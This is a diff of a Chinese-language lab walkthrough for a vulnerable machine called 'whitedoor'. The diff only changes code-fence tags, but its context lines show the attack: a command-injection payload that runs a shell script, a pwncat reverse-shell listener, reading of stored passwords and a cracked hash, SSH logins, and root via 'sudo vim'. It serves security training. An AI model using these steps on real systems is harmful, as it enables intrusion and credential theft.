@@ -95,7 +95,7 @@ SEND: ls;bash /tmp/shell.sh
 
 成功收到反弹的 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs -lp 9999
 [23:40:11] Welcome to pwncat 🐈!                                                                                                                                                                 __main__.py:164
@@ -110,7 +110,7 @@ www-data
 
 对用户进行探测，发现敏感凭据
 
-```shell
+```bash
 (remote) www-data@whitedoor:/home/whiteshell/Desktop$ cat .my_secret_password.txt
 whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
 ```
@@ -125,7 +125,7 @@ Base64 decode --> Th1sIsTh3P4sSwOrDblac5
 
 尝试进行登录
 
-```shell
+```bash
 (local) pwncat$ connect whiteshell@192.168.56.123
 Password: **********************
 [23:55:17] 192.168.56.123:22: normalizing shell path                                                                                                                                              manager.py:957
@@ -139,7 +139,7 @@ whiteshell
 
 对用户进行探测，发现敏感凭据
 
-```shell
+```bash
 (remote) whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat .my_secret_hash
 $2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
 ```
@@ -152,7 +152,7 @@ CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj --> qwertyuiop
 
 尝试登陆
 
-```shell
+```bash
 (local) pwncat$ connect Gonzalo@192.168.56.123
 Password: **********
 [00:00:14] 192.168.56.123:22: normalizing shell path                                                                                                                                              manager.py:957
@@ -164,7 +164,7 @@ Gonzalo
 
 ### flag - user
 
-```shell
+```bash
 (remote) Gonzalo@whitedoor:/home/Gonzalo/Desktop$ cat user.txt
 Y0uG3tTh3Us3RFl4g!!
 ```
@@ -183,7 +183,7 @@ User Gonzalo may run the following commands on whitedoor:
 
 参考 [vim | GTFOBins](https://gtfobins.github.io/gtfobins/vim/)
 
-```shell
+```bash
 (remote) Gonzalo@whitedoor:/home/Gonzalo/Desktop$ sudo vim -c ':!/bin/sh'
 
 # whoami
@@ -192,7 +192,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 # cat root.txt
 Y0uAr3Th3B3sTy0Ug3Tr0oT!!
 ```
